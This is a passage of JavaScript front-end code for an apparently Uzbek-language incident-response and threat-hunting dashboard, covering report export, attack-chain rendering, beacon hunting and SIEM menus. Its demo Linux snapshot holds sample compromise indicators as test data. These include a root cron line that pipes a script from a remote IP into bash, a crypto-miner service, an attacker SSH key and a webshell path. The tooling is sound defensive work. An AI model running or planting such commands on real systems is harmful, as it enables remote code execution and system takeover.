        data.resp_content = await new Promise(r => { const rd = new FileReader(); rd.onload = e => r(e.target.result); rd.readAsText(respFile); });
        data.resp_filename = respFile.name;
    } else {
        data.resp_path = document.getElementById('rep-resp')?.value || '';
    }
    
    const outDiv = document.getElementById('rep-out');
    outDiv.innerHTML = '<div class="card spinner-container"><div class="spinner"></div><p>Hisobot generatsiya qilinmoqda...</p></div>';
    
    try {
        const res = await fetch('/api/report', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        });
        const out = await res.json();
        if (out.error) {
            outDiv.innerHTML = `<div class="card" style="color:var(--red);">${escapeHtml(out.error)}</div>`;
            return;
        }
        outDiv.innerHTML = `
            <div class="card" style="border-color:var(--green-border); background:var(--green-bg); display:flex; justify-content:space-between; align-items:center;">
                <span>✅ <b>Hisobot yaratildi:</b> ${escapeHtml(out.path || "report.html")}</span>
                <a class="btn btn-primary btn-sm" href="data:text/html;charset=utf-8,${encodeURIComponent(out.html)}" download="incident_report.html">📥 HTML Yuklab Olish</a>
            </div>
        `;
        
        const iframe = document.getElementById('rep-preview');
        iframe.srcdoc = out.html;
        iframe.style.display = 'block';
    } catch (e) {
        outDiv.innerHTML = `<div class="card" style="color:var(--red);">${escapeHtml(String(e))}</div>`;
    }
}

// ==================== Demo & Cyber HUD Live Effects ====================

const DEMO_LINUX_SNAPSHOT = {
  "meta": {"os": "linux", "hostname": "web-prod-01", "collected_at": "2026-09-18T12:00:00", "collector_version": "1.0"},
  "users": [
    {"name": "root", "uid": 0, "is_admin": true, "shell": "/bin/bash"},
    {"name": "www-data", "uid": 33, "is_admin": false, "shell": "/usr/sbin/nologin"},
    {"name": "support", "uid": 0, "is_admin": true, "shell": "/bin/bash"}
  ],
  "services": [
    {"name": "nginx", "display": "nginx", "state": "Running", "start_mode": "enabled", "binary_path": "/usr/sbin/nginx", "run_as": "root"},
    {"name": "sysupdate", "display": "sysupdate", "state": "Running", "start_mode": "enabled", "binary_path": "/tmp/.x/xmrig", "run_as": "root"}
  ],
  "tasks": [],
  "cron": [
    {"user": "root", "line": "* * * * * curl -s http://185.220.101.44/x.sh | bash", "file": "/var/spool/cron/crontabs/root"}
  ],
  "autoruns": [
    {"location": "/etc/systemd/system/sysupdate.service", "name": "sysupdate", "value": "/tmp/.x/xmrig -o stratum+tcp://185.220.101.44:3333"}
  ],
  "ssh_authorized_keys": [
    {"user": "root", "file": "/root/.ssh/authorized_keys", "key_fingerprint_or_line": "ssh-rsa AAAAB3NzaC1yc2attacker root@evil"}
  ],
  "suid_files": ["/usr/bin/passwd", "/usr/bin/sudo", "/tmp/rootbash"],
  "remote_access_tools": [],
  "hosts_file": [],
  "listening_ports": [
    {"proto": "tcp", "addr": "0.0.0.0", "port": 80, "pid": 700, "process": "nginx"},
    {"proto": "tcp", "addr": "0.0.0.0", "port": 22, "pid": 640, "process": "sshd"}
  ],
  "connections": [
    {"proto": "tcp", "laddr": "10.0.1.15", "lport": 51020, "raddr": "203.0.113.88", "rport": 4444, "pid": 1400, "process": "bash"},
    {"proto": "tcp", "laddr": "10.0.1.15", "lport": 51044, "raddr": "185.220.101.44", "rport": 3333, "pid": 1502, "process": "xmrig"}
  ],
  "recent_modified": [
    {"path": "/var/www/html/uploads/shell.php", "mtime": "2026-09-18T10:01:40"},
    {"path": "/tmp/.x/xmrig", "mtime": "2026-09-18T10:11:30"},
    {"path": "/tmp/rootbash", "mtime": "2026-09-18T10:06:24"}
  ],
  "errors": []
};

function loadDemoSnapshot() {
    const curIn = document.getElementById('resp-cur');
    const osSelect = document.getElementById('resp-os');
    if (curIn) {
        curIn.value = JSON.stringify(DEMO_LINUX_SNAPSHOT);
    }
    if (osSelect) {
        osSelect.value = 'linux';
    }
    const snapFile = document.getElementById('resp-snap-file');
    if (snapFile) snapFile.value = '';
    showToast('⚡ Namuna snapshot yuklandi (Linux)!');
    respTriage();
}

function loadDemoLog() {
    const input = document.getElementById('log-path');
    if (input) {
        input.value = 'elasticsearch_export.json';
        const fileIn = document.getElementById('log-file');
        if (fileIn) fileIn.value = '';
        showToast('⚡ Namuna log yo\'li tanlandi!');
        logAnalyze();
    }
}

function initClock() {
    const el = document.getElementById('soc-clock');
    if (!el) return;
    function update() {
        const now = new Date();
        const hours = String(now.getHours()).padStart(2, '0');
        const mins = String(now.getMinutes()).padStart(2, '0');
        const secs = String(now.getSeconds()).padStart(2, '0');
        el.innerText = `${hours}:${mins}:${secs}`;
    }
    update();
    setInterval(update, 1000);
}

function initCyberCanvas() {
    const canvas = document.getElementById('cyber-canvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    let width = canvas.width = window.innerWidth;
    let height = canvas.height = window.innerHeight;

    window.addEventListener('resize', () => {
        width = canvas.width = window.innerWidth;
        height = canvas.height = window.innerHeight;
    });

    const particles = [];
    const count = Math.min(48, Math.max(24, Math.floor((width * height) / 32000)));
    for (let i = 0; i < count; i++) {
        particles.push({
            x: Math.random() * width,
            y: Math.random() * height,
            vx: (Math.random() - 0.5) * 0.45,
            vy: (Math.random() - 0.5) * 0.45,
            radius: Math.random() * 2.2 + 1,
            isHex: Math.random() > 0.65,
            glow: Math.random() > 0.5
        });
    }

    let mouse = { x: -1000, y: -1000 };
    window.addEventListener('mousemove', (e) => {
        mouse.x = e.clientX;
        mouse.y = e.clientY;
    });

    function drawHexagon(x, y, r) {
        ctx.beginPath();
        for (let i = 0; i < 6; i++) {
            const angle = (Math.PI / 3) * i;
            const hx = x + r * Math.cos(angle);
            const hy = y + r * Math.sin(angle);
            if (i === 0) ctx.moveTo(hx, hy);
            else ctx.lineTo(hx, hy);
        }
        ctx.closePath();
    }

    function animate() {
        ctx.clearRect(0, 0, width, height);

        for (let i = 0; i < particles.length; i++) {
            const p = particles[i];
            p.x += p.vx;
            p.y += p.vy;

            if (p.x < 0) p.x = width;
            else if (p.x > width) p.x = 0;
            if (p.y < 0) p.y = height;
            else if (p.y > height) p.y = 0;

            for (let j = i + 1; j < particles.length; j++) {
                const p2 = particles[j];
                const dx = p.x - p2.x;
                const dy = p.y - p2.y;
                const dist = Math.sqrt(dx * dx + dy * dy);

                if (dist < 135) {
                    const alpha = (1 - dist / 135) * 0.22;
                    ctx.strokeStyle = `rgba(0, 212, 255, ${alpha})`;
                    ctx.lineWidth = 1;
                    ctx.beginPath();
                    ctx.moveTo(p.x, p.y);
                    ctx.lineTo(p2.x, p2.y);
                    ctx.stroke();
                }
            }

            const mdx = p.x - mouse.x;
            const mdy = p.y - mouse.y;
            const mdist = Math.sqrt(mdx * mdx + mdy * mdy);
            if (mdist < 150) {
                const malpha = (1 - mdist / 150) * 0.4;
                ctx.strokeStyle = `rgba(0, 245, 212, ${malpha})`;
                ctx.lineWidth = 1.2;
                ctx.beginPath();
                ctx.moveTo(p.x, p.y);
                ctx.lineTo(mouse.x, mouse.y);
                ctx.stroke();
            }

            if (p.isHex) {
                drawHexagon(p.x, p.y, p.radius * 2.2);
                ctx.strokeStyle = p.glow ? 'rgba(0, 240, 255, 0.7)' : 'rgba(0, 119, 255, 0.4)';
                ctx.lineWidth = 1.2;
                ctx.stroke();
            } else {
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
                ctx.fillStyle = p.glow ? 'rgba(0, 245, 212, 0.8)' : 'rgba(0, 212, 255, 0.4)';
                ctx.fill();
            }
        }

        requestAnimationFrame(animate);
    }

    animate();
}

// ==================== INCIDENT RESPONSE ENGINE ====================

let lastIRResult = null;

function loadDemoIRLog() {
    const p = document.getElementById('ir-log-path');
    if (p) p.value = 'elasticsearch_export.json';
    const f = document.getElementById('ir-log-file');
    if (f) f.value = '';
    showToast("⚡ Namuna log yo'li tanlandi!");
    runIRChainAnalysis();
}

function downloadBlob(content, filename, mimeType) {
    const blob = new Blob([content], { type: mimeType });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    showToast(`💾 Yuklab olindi: ${filename}`);
}

function copyToClipboard(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => showToast("📋 Buferga nusxa olindi!"));
    } else {
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        showToast("📋 Buferga nusxa olindi!");
    }
}

async function runIRChainAnalysis() {
    const pathInput = document.getElementById('ir-log-path');
    const fileInput = document.getElementById('ir-log-file');
    const langSelect = document.getElementById('ir-lang');
    const out = document.getElementById('ir-out');
    const btn = document.getElementById('btn-ir-analyze');

    const path = pathInput ? pathInput.value.trim() : '';
    const files = fileInput && fileInput.files ? fileInput.files : [];
    const lang = langSelect ? langSelect.value : 'ru';

    if (!path && files.length === 0) {
        showToast("⚠️ Iltimos, log fayl yo'lini kiriting yoki fayl tanlang!", "error");
        return;
    }

    if (btn) {
        btn.disabled = true;
        btn.innerHTML = `<span>⏳ Zanjir tiklanmoqda...</span>`;
    }

    if (out) {
        out.innerHTML = `
            <div class="card card-hud" style="text-align: center; padding: 40px; margin-top: 24px;">
                <div class="spinner" style="margin: 0 auto 16px auto;"></div>
                <div style="font-size: 17px; font-weight: 600; color: var(--neon-cyan);">Loglar tahlil qilinmoqda...</div>
                <div class="helper-text" style="margin-top: 8px;">Standart tizim jarayonlari saralanib, haqiqiy kiberhujum zanjiri ajratilmoqda.</div>
            </div>
        `;
    }

    try {
        let payload = { lang: lang };
        if (files.length > 0) {
            payload.files = [];
            for (let f of files) {
                const content = await f.text();
                payload.files.push({ filename: f.name, content: content });
            }
        } else if (path.includes(',')) {
            payload.files = path.split(',').map(p => ({ path: p.trim() }));
        } else {
            payload.path = path;
        }
        
        payload.src_tz = document.getElementById('log-src-tz')?.value || '+05:00';

        const res = await fetch('/api/ir/chain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (!res.ok) {
            const errData = await res.json().catch(() => ({}));
            throw new Error(errData.error || `Server xatosi: ${res.status}`);
        }

        const data = await res.json();
        lastIRResult = data;
        renderIRResults(data);
        showToast("⚡ Hujum zanjiri va MITRE korrelyatsiyasi muvaffaqiyatli tiklandi!");
    } catch (err) {
        console.error(err);
        showToast(`❌ Xatolik: ${err.message}`, "error");
        if (out) {
            out.innerHTML = `
                <div class="card card-hud" style="border-color: var(--crimson); margin-top: 24px;">
                    <div class="card-title" style="color: var(--crimson);">❌ Xatolik yuz berdi</div>
                    <p class="helper-text" style="color: var(--crimson);">${escapeHtml(err.message)}</p>
                </div>
            `;
        }
    } finally {
        if (btn) {
            btn.disabled = false;
            btn.innerHTML = `<span>🚀 Zanjirni Tiklash</span>`;
        }
    }
}

function renderIRResults(data) {
    const out = document.getElementById('ir-out');
    if (!out) return;

    const model = data.model || {};
    const chain = model.chain || {};
    const stages = chain.stages || [];
    const iocs = model.all_iocs || [];
    const mitre = model.mitre_summary || [];

    const severityColor = model.severity === 'CRITICAL' ? 'var(--crimson)' : 'var(--amber)';

    let stagesHtml = '';
    stages.forEach((s, idx) => {
        const ts = s.timestamp_display || (s.timestamp || '').substring(0, 19).replace('T', ' ');
        stagesHtml += `
            <tr>
                <td style="font-weight: 700; color: var(--neon-cyan); text-align: center;">${idx + 1}</td>
                <td style="font-family: var(--font-mono); font-size: 13.5px; white-space: nowrap;">${escapeHtml(ts)}</td>
                <td><span class="badge" style="background: rgba(6, 182, 212, 0.15); color: var(--neon-cyan); border: 1px solid rgba(6, 182, 212, 0.3); font-weight: 600;">${escapeHtml(s.host || 'N/A')}</span></td>
                <td><span class="badge" style="background: rgba(245, 158, 11, 0.15); color: var(--amber); border: 1px solid rgba(245, 158, 11, 0.3); white-space: normal; text-align: center; line-height: 1.3;">${escapeHtml(s.phase || '')}</span></td>
                <td>
                    <span class="badge" style="background: rgba(16, 185, 129, 0.15); color: var(--cyber-mint); border: 1px solid rgba(16, 185, 129, 0.3); font-weight: 700;">${escapeHtml(s.technique_id)}</span>
                    <span style="font-size: 13.5px; margin-left: 6px;">${escapeHtml(s.technique_name)}</span>
                </td>
                <td style="font-family: var(--font-mono); font-size: 12.5px; line-height: 1.45; min-width: 260px; overflow-wrap: anywhere; color: var(--text-muted);">${escapeHtml(s.evidence || '')}</td>
                <td style="font-size: 13px; line-height: 1.5; min-width: 300px; color: var(--text-main);">${escapeHtml(s.explain_uz || '')}</td>
            </tr>
        `;
    });

    let iocsHtml = '';
    iocs.forEach(i => {
        iocsHtml += `
            <tr>
                <td style="font-family: var(--font-mono); font-weight: 700; color: var(--cyber-mint);">${escapeHtml(i.value)}</td>
                <td><span class="badge" style="background: rgba(255,255,255,0.06); color: var(--text-muted);">${escapeHtml(i.type)}</span></td>
                <td><span class="badge" style="background: rgba(239, 68, 68, 0.15); color: var(--crimson);">${escapeHtml(i.role)}</span></td>
                <td style="font-size: 13.5px; color: var(--text-muted);">${escapeHtml(i.description)}</td>
            </tr>
        `;
    });

    let mitreHtml = '';
    mitre.forEach(m => {
        mitreHtml += `
            <tr>
                <td><b style="color: var(--cyber-mint); font-family: var(--font-mono);">${escapeHtml(m.technique_id)}</b></td>
                <td style="font-weight: 600;">${escapeHtml(m.technique_name)}</td>
                <td><span class="badge" style="background: rgba(6, 182, 212, 0.15); color: var(--neon-cyan);">${escapeHtml(m.phase)}</span></td>
                <td><span class="brand-badge" style="color: var(--cyber-mint); border-color: var(--cyber-mint);">🟢 TASDIQLANGAN</span></td>
                <td style="text-align: center; font-weight: 700;">${m.occurrences || 1}</td>
                <td style="font-family: var(--font-mono); font-size: 13px; color: var(--text-muted); max-width: 380px; word-break: break-all;">${escapeHtml(m.sample_evidence || '')}</td>
            </tr>
        `;
    });

    const edges = chain.lateral_edges || [];
    const lpath = chain.attack_path || [];
    let lateralHtml = `<h3 class="section-title" style="margin-top: 30px; font-size: 20px;">🔀 Hostdan hostga o'tish (Lateral Movement) — ${edges.length} ta</h3>`;
    if (edges.length === 0) {
        lateralHtml += `<p style="color:var(--text-muted)">Hostdan hostga o'tish aniqlanmadi.</p>`;
    } else {
        lateralHtml += `<div class="card card-hud" style="padding: 0; overflow-x: auto;">`;
        if (lpath.length > 0) {
            lateralHtml += `<div style="padding: 16px 20px; border-bottom: 1px solid var(--border-card); font-size: 14px; color: #fff;">`;
            lateralHtml += `Hujum yo'li: ` + lpath.map(h => `<code>${escapeHtml(h)}</code>`).join(' → ');
            lateralHtml += `</div>`;
        }
        lateralHtml += `<table class="data-table" style="margin: 0; width: 100%;">
                <thead>
                    <tr>
                        <th style="width: 44px;">#</th>
                        <th>Vaqt (logdagi)</th>
                        <th>Dan</th>
                        <th>Ga</th>
                        <th>Akkaunt</th>
                        <th>Usul</th>
                        <th>MITRE</th>
                        <th>Holat</th>
                    </tr>
                </thead>
                <tbody>`;
        edges.forEach((e, idx) => {
            const ts = e.first_seen_display || (e.first_seen || '').substring(0, 19).replace('T', ' ');
            const meth = e.count > 1 ? `${e.method} (x${e.count})` : e.method;
            const techs = (e.techniques || []).join(', ');
            let stColor = 'var(--text-muted)';
            if (e.status === 'SUSPECTED') stColor = 'var(--amber)';
            if (e.status === 'CONFIRMED') stColor = 'var(--crimson)';
            lateralHtml += `<tr>
                    <td style="font-weight: 700; color: var(--neon-cyan); text-align: center;">${idx + 1}</td>
                    <td style="font-family: var(--font-mono); font-size: 13.5px; white-space: nowrap;">${escapeHtml(ts)}</td>
                    <td><span class="badge" style="background: rgba(255,255,255,0.06);">${escapeHtml(e.src_host || '?')}</span></td>
                    <td><span class="badge" style="background: rgba(255,255,255,0.06);">${escapeHtml(e.dst_host || '?')}</span></td>
                    <td style="color: var(--amber); font-weight: 600;">${escapeHtml(e.user || '')}</td>
                    <td>${escapeHtml(meth || '')}</td>
                    <td style="color: var(--cyber-mint); font-family: var(--font-mono);">${escapeHtml(techs)}</td>
                    <td><span class="badge" style="background: rgba(255,255,255,0.06); color: ${stColor}; border: 1px solid ${stColor};">${escapeHtml(e.status || '')}</span></td>
                </tr>`;
        });
        lateralHtml += `</tbody></table></div>`;
    }

    out.innerHTML = `
        <div class="card card-hud" style="margin-top: 24px; border-left: 5px solid ${severityColor};">
            <div style="display: flex; justify-content: space-between; align-items: flex-start; flex-wrap: wrap; gap: 16px;">
                <div>
                    <div style="display: flex; gap: 10px; align-items: center; margin-bottom: 8px;">
                        <span class="brand-badge" style="background: rgba(239,68,68,0.2); color: ${severityColor}; border-color: ${severityColor}; font-weight: 800; font-size: 13px;">${model.severity} SEVERITY</span>
                        <span class="brand-badge" style="color: var(--cyber-mint); border-color: var(--cyber-mint);">ISHONCHLILIK: ${model.confidence_pct}%</span>
                        <span style="color: var(--text-dim); font-family: var(--font-mono); font-size: 13px;">${escapeHtml(model.case_id || '')}</span>
                    </div>
                    <h3 style="font-size: 20px; font-weight: 700; color: #fff; margin: 0 0 8px 0;">${escapeHtml(model.title || '')}</h3>
                    <div style="display: flex; gap: 20px; flex-wrap: wrap; font-size: 14px; color: var(--text-muted);">
                        <div>🏢 <b>Hostlar:</b> ${(model.hosts || []).map(h => `<code style="color:var(--neon-cyan);">${escapeHtml(h)}</code>`).join(', ')}</div>
                        <div>👤 <b>Accountlar:</b> ${(model.accounts || []).map(a => `<code style="color:var(--amber);">${escapeHtml(a)}</code>`).join(', ')}</div>
                        <div>⏱ <b>Vaqt:</b> ${(model.period_start_display || (model.period_start || '').substring(0,19).replace('T',' '))} – ${(model.period_end_display || (model.period_end || '').substring(0,19).replace('T',' '))}</div>
                        <div>📊 <b>Tahlil:</b> ${model.total_events_processed || 0} log, <b>${stages.length} ta zanjir qadami</b></div>
                    </div>
                </div>
                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <button class="btn btn-primary" onclick="downloadBlob(JSON.stringify(lastIRResult.scoring_json, null, 2), 'submission.json', 'application/json')" style="background: linear-gradient(135deg, rgba(16, 185, 129, 0.3), rgba(6, 182, 212, 0.3)); border-color: var(--cyber-mint); font-weight: 600;">
                        📥 submission.json (Ball / Hakamlar)
                    </button>
                    <button class="btn btn-secondary" onclick="downloadBlob(lastIRResult.report_md, 'incident_report.md', 'text/markdown')">
                        📑 incident_report.md
                    </button>
                    <button class="btn btn-secondary" onclick="copyToClipboard(lastIRResult.report_md)">
                        📋 Hisobotdan Nusxa Olish
                    </button>
                </div>
            </div>
        </div>

        <h3 class="section-title" style="margin-top: 30px; font-size: 20px;">⛓ To'liq Kiberhujum Zanjiri (Attack Chain Timeline)</h3>
        <div class="card card-hud" style="padding: 0; overflow-x: auto;">
            <table class="data-table" style="margin: 0; width: 100%;">
                <thead>
                    <tr>
                        <th style="width: 44px;">#</th>
                        <th style="width: 150px;">Vaqt (logdagi)</th>
                        <th style="width: 112px;">Host</th>
                        <th style="width: 150px;">Hujum Fazasi</th>
                        <th style="width: 210px;">MITRE ATT&amp;CK</th>
                        <th style="min-width: 260px;">Aniq Dalil (Evidence / Payload)</th>
                        <th style="min-width: 300px;">Izoh (nima sodir bo'ldi)</th>
                    </tr>
                </thead>
                <tbody>
                    ${stagesHtml}
                </tbody>
            </table>
        </div>
        
        ${lateralHtml}

        <div class="grid-2" style="margin-top: 24px;">
            <div class="card card-hud" style="padding: 0; overflow-x: auto;">
                <div style="padding: 16px 20px; border-bottom: 1px solid var(--border-card); font-weight: 700; font-size: 16px; color: var(--cyber-mint);">
                    🎯 Aniq Dalillar va IOC'lar (${iocs.length} ta)
                </div>
                <table class="data-table" style="margin: 0;">
                    <thead>
                        <tr>
                            <th>IOC Qiymati</th>
                            <th>Turi</th>
                            <th>Roli</th>
                            <th>Tavsif</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${iocsHtml}
                    </tbody>
                </table>
            </div>

            <div class="card card-hud" style="padding: 0; overflow-x: auto;">
                <div style="padding: 16px 20px; border-bottom: 1px solid var(--border-card); font-weight: 700; font-size: 16px; color: var(--neon-cyan);">
                    🗺 MITRE ATT&amp;CK Matritsasi (${mitre.length} texnika)
                </div>
                <table class="data-table" style="margin: 0;">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Texnika Nomi</th>
                            <th>Faza</th>
                            <th>Status</th>
                            <th>Soni</th>
                            <th>Namuna Dalil</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${mitreHtml}
                    </tbody>
                </table>
            </div>
        </div>
    `;
}


// ==================== IR: bir nechta fayl + drag & drop ====================
function irRenderFileList() {
    const input = document.getElementById('ir-log-file');
    const box = document.getElementById('ir-file-list');
    if (!input || !box) return;
    const files = input.files || [];
    if (!files.length) { box.innerHTML = ''; return; }
    let total = 0;
    let rows = '';
    for (let f of files) {
        total += f.size;
        rows += `<span class="ir-file-chip">\u{1F4C4} ${escapeHtml(f.name)} <b>${(f.size/1048576).toFixed(1)} MB</b></span>`;
    }
    box.innerHTML = `<div style="margin-top:10px;">${rows}
        <div class="helper-text" style="margin:6px 0 0 0;">${files.length} ta fayl tanlandi, jami ${(total/1048576).toFixed(1)} MB \u2014 birgalikda bitta zanjirga birlashtiriladi.</div></div>`;
}

function irClearFiles() {
    const input = document.getElementById('ir-log-file');
    if (input) input.value = '';
    irRenderFileList();
}

function setupIRDropzone() {
    const zone = document.getElementById('ir-dropzone');
    const input = document.getElementById('ir-log-file');
    if (!zone || !input) return;

    input.addEventListener('change', irRenderFileList);

    ['dragenter', 'dragover'].forEach(ev => {
        zone.addEventListener(ev, e => {
            e.preventDefault();
            e.stopPropagation();
            zone.classList.add('dropzone-active');
        });
    });
    ['dragleave', 'drop'].forEach(ev => {
        zone.addEventListener(ev, e => {
            e.preventDefault();
            e.stopPropagation();
            if (ev === 'dragleave' && zone.contains(e.relatedTarget)) return;
            zone.classList.remove('dropzone-active');
        });
    });

    zone.addEventListener('drop', e => {
        const dropped = e.dataTransfer && e.dataTransfer.files ? e.dataTransfer.files : null;
        if (!dropped || !dropped.length) return;
        try {
            const dt = new DataTransfer();
            for (let f of input.files) dt.items.add(f);   // avval tanlanganlari saqlanadi
            for (let f of dropped) dt.items.add(f);
            input.files = dt.files;
        } catch (err) {
            input.files = dropped;                        // eski brauzerlar uchun zaxira
        }
        irRenderFileList();
        showToast(`${dropped.length} ta fayl qo'shildi`, 'success');
    });

    // butun sahifaga tashlab yuborilsa brauzer faylni ochib yubormasin
    ['dragover', 'drop'].forEach(ev => {
        window.addEventListener(ev, e => {
            if (!zone.contains(e.target)) e.preventDefault();
        });
    });
}

// Auto-run on startup
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        initClock();
        loadPlaybook();
        initCyberCanvas();
        setupIRDropzone();
    });
} else {
    initClock();
    loadPlaybook();
    initCyberCanvas();
    setupIRDropzone();
}




// --- C2 HUNT ---
let huntFiles = [];
const huntDropzone = document.getElementById('hunt-dropzone');
const huntFileInput = document.getElementById('hunt-file');
const huntFileList = document.getElementById('hunt-file-list');
let lastHuntData = null;

if (huntDropzone) {
    huntDropzone.addEventListener('click', () => huntFileInput.click());
    huntDropzone.addEventListener('dragover', (e) => { e.preventDefault(); huntDropzone.classList.add('dragover'); });
    huntDropzone.addEventListener('dragleave', () => huntDropzone.classList.remove('dragover'));
    huntDropzone.addEventListener('drop', (e) => {
        e.preventDefault();
        huntDropzone.classList.remove('dragover');
        if (e.dataTransfer.files.length > 0) handleHuntFiles(e.dataTransfer.files);
    });
    huntFileInput.addEventListener('change', (e) => {
        if (e.target.files.length > 0) handleHuntFiles(e.target.files);
    });
}

function handleHuntFiles(files) {
    for (let f of files) {
        if (f.size > 20 * 1024 * 1024) {
            showToast(f.name + " fayli 20MB dan katta", true);
            continue;
        }
        let reader = new FileReader();
        reader.onload = (e) => {
            huntFiles.push({ filename: f.name, content: e.target.result });
            renderHuntFileList();
        };
        reader.readAsText(f);
    }
}

function renderHuntFileList() {
    huntFileList.innerHTML = '';
    huntFiles.forEach((f, i) => {
        let div = document.createElement('div');
        div.className = 'file-item';
        div.innerHTML = `<span>📄 ${f.filename}</span><span style="color:var(--crimson);cursor:pointer;" onclick="huntFiles.splice(${i}, 1); renderHuntFileList();">✖</span>`;
        huntFileList.appendChild(div);
    });
}

function huntClearFiles() {
    huntFiles = [];
    renderHuntFileList();
    document.getElementById('hunt-path').value = '';
}

async function runHuntBeacons() {
    let p = document.getElementById('hunt-path').value.trim();
    if (huntFiles.length === 0 && !p) {
        showToast("Fayl(lar)ni yuklang yoki yo'lni ko'rsating", true);
        return;
    }
    
    let btn = document.getElementById('hunt-btn');
    btn.disabled = true;
    let oldTxt = btn.innerText;
    btn.innerHTML = '<span class="spinner"></span> Ishlanmoqda...';
    
    document.getElementById('hunt-error').style.display = 'none';
    document.getElementById('hunt-result').style.display = 'none';
    
    let payload = {
        min_sessions: parseInt(document.getElementById('hunt-min-sessions').value) || 10,
        max_hosts: parseInt(document.getElementById('hunt-max-hosts').value) || 100,
        all: document.getElementById('hunt-all').checked,
        iocs: document.getElementById('hunt-ioc').value.trim()
    };
    
    if (huntFiles.length > 0) {
        payload.files = huntFiles;
    } else {
        payload.path = p;
    }
    
    payload.src_tz = document.getElementById('log-src-tz')?.value || '+05:00';
    
    try {
        let res = await fetch('/api/hunt/beacons', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
        let data = await res.json();
        if (!res.ok) {
            throw new Error(data.error || 'Server xatosi');
        }
        lastHuntData = data;
        renderHuntResults(data);
        showToast("Tahlil yakunlandi");
    } catch(err) {
        document.getElementById('hunt-error').innerText = err.message;
        document.getElementById('hunt-error').style.display = 'block';
    }
    
    btn.disabled = false;
    btn.innerText = oldTxt;
}

function renderHuntResults(data) {
    let summary = data.summary;
    let cands = data.candidates;
    
    document.getElementById('hunt-summary-title').innerText = `${summary.checked} ta nomzod tekshirildi, ${summary.high_medium} tasi YUQORI/O'RTA.`;
    if(summary.tz_note) document.getElementById('hunt-tz-note').innerText = summary.tz_note;
    
    let tbody = document.querySelector('#hunt-table tbody');
    tbody.innerHTML = '';
    
    cands.forEach(c => {
        let tr = document.createElement('tr');
        
        let color = 'var(--text-primary)';
        if(c.level === 'YUQORI') color = 'var(--cyber-red)';
        else if(c.level === "O'RTA") color = 'var(--cyber-amber)';
        else if(c.level === "MA'LUM") color = 'var(--neon-cyan)';
        else if(c.level === "PAST") color = 'var(--text-muted)';
        
        let cvStr = c.cv_ratio !== null ? c.cv_ratio.toFixed(2) : '-';
        let medStr = c.median_interval ? c.median_interval.toFixed(0) + 's' : '-';
        
        let avgStr = formatBytesJS(c.avg_sent);
        let durStr = formatDurationJS(c.max_duration);
        let scoreStr = c.score === 999 ? '-' : c.score;
        
        tr.innerHTML = `
            <td>${scoreStr}</td>
            <td style="color:${color}; font-weight:bold;">${c.level}</td>
            <td style="font-family:monospace;">${c.dst_ip}</td>
            <td>${c.dst_port}</td>
            <td>${c.dst_host_count}</td>
            <td>${c.sessions}</td>
            <td>${medStr}</td>
            <td>${cvStr}</td>
            <td>${avgStr}</td>
            <td>${durStr}</td>
            <td>${c.first_seen}</td>
        `;
        tbody.appendChild(tr);
        
        if (c.hosts && c.hosts.length > 0) {
            let trHosts = document.createElement('tr');
            let tdHosts = document.createElement('td');
            tdHosts.colSpan = 11;
            tdHosts.style.padding = '0.5rem 1rem 1rem 3rem';
            tdHosts.style.backgroundColor = 'var(--bg-card)';
            tdHosts.style.borderBottom = '1px solid var(--border-card)';
            
            let html = '';
            c.hosts.forEach(h => {
                let hname = h.host ? ` (${h.host})` : '';
                if (h.sessions === 0) {
                    html += `<div style="color:var(--text-muted); font-family:monospace;">&rarr; ${h.src_ip}${hname} (ESET, sessiya yo'q)</div>`;
                } else {
                    html += `<div style="color:var(--text-dim); font-family:monospace;">&rarr; ${h.src_ip}${hname} &mdash; ${h.sessions} sessiya</div>`;
                }
            });
            tdHosts.innerHTML = html;
            trHosts.appendChild(tdHosts);
            tbody.appendChild(trHosts);
        }
    });
    
    document.getElementById('hunt-result').style.display = 'block';
}

function downloadHuntJson() {
    if (!lastHuntData) return;
    downloadBlob(JSON.stringify(lastHuntData, null, 2), 'hunt_results.json', 'application/json');
}

function formatBytesJS(bytes) {
    if (!bytes || bytes === 0) return "0 B";
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function formatDurationJS(seconds) {
    if (!seconds || seconds === 0) return "0s";
    if (seconds < 60) return seconds.toFixed(0) + "s";
    let m = seconds / 60;
    if (m < 60) return m.toFixed(1) + "m";
    let h = m / 60;
    if (h < 24) return h.toFixed(1) + " soat";
    let d = h / 24;
    return d.toFixed(1) + " kun";
}

// ==================== SIEM ====================
let siemMeta = null;
let lastSiemResults = null;
let siemFilterDebounce = null;

async function loadSiemMeta() {
    if (siemMeta) return;
    try {
        const dialectsObj = await api('/api/siem/dialects');
        const huntsRes = await api('/api/siem/hunts');
        
        siemMeta = { dialects: dialectsObj, hunts: huntsRes.hunts, categories: huntsRes.categories };
        
        const dialEl = document.getElementById('siem-dialect');
        dialEl.innerHTML = '';
        for (const [k, d] of Object.entries(dialectsObj)) {
            dialEl.innerHTML += `<option value="${k}">${escapeHtml(d.name)} (${escapeHtml(d.language)})</option>`;
        }
        dialEl.innerHTML += '<option value="all">Barcha SIEM lar</option>';
        
        const catEl = document.getElementById('siem-category');
        catEl.innerHTML = '<option value="">Hammasi</option>';
        for (const [k, v] of Object.entries(siemMeta.categories)) {
            catEl.innerHTML += `<option value="${k}">${escapeHtml(v)}</option>`;
        }
        
        renderSiemHuntOptions();
    } catch (e) {
